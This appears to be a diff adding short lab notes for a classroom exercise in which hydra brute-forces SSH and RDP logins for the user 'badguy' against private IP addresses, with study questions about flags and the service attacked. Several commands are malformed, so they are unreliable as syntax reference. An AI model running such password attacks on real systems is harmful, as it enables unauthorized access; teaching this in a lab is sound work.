@@ -1,0 +1,18 @@
+sudo apt update 
+
+sudo apt install openssh-server
+sudo hydra -l badguy -p passwd.txt 192.168.1.3 ssh
+sudo hydra -l badguy -p passwd.txt 10.254.7.68 ssh
+
+sudo hydra -l badguy -p passwd.txt 192.168.1.3 rdp 
+sudo hydra -l badguy -p passwd.txt 10.254.7.68 rdp
+  
+(change the ssh to another
+service like RDP or ssh what happens?)
+
+sudo hydra -l badguy -p password_list.txt rdp://192.168.1.20
+Explain what the different is between a -P and a lower -p in hydra.
+sudo hydra -l badguy -p password_list.txt rdp://10.254.7.50
+sudo hydra -l bad guy -P 22 passwd.txt 10.254.7.68 
+  What service are we attacking
+here?
